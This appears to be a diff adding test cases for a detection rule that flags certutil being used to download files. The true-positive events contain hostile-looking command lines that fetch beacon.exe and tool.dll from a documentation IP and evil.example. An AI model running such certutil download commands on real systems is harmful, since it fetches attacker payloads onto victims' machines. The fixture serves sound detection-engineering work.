@@ -1,0 +1,25 @@
+rule: command_and_control/proc_creation_certutil_download.yml
+atomic_test: T1105 / "certutil download (urlcache)" and "(verifyctl)"
+true_positives:
+  - name: certutil urlcache download of an exe
+    event:
+      EventID: 1
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -urlcache -split -f http://192.0.2.5/beacon.exe C:\Users\Public\b.exe'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+  - name: certutil verifyctl download
+    event:
+      EventID: 1
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -verifyctl -split -f https://evil.example/tool.dll'
+true_negatives:
+  - name: certutil hashing a local file is benign
+    event:
+      EventID: 1
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -hashfile C:\Windows\System32\notepad.exe SHA256'
+  - name: certutil decoding a local base64 file is benign
+    event:
+      EventID: 1
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -decode C:\temp\in.b64 C:\temp\out.bin'
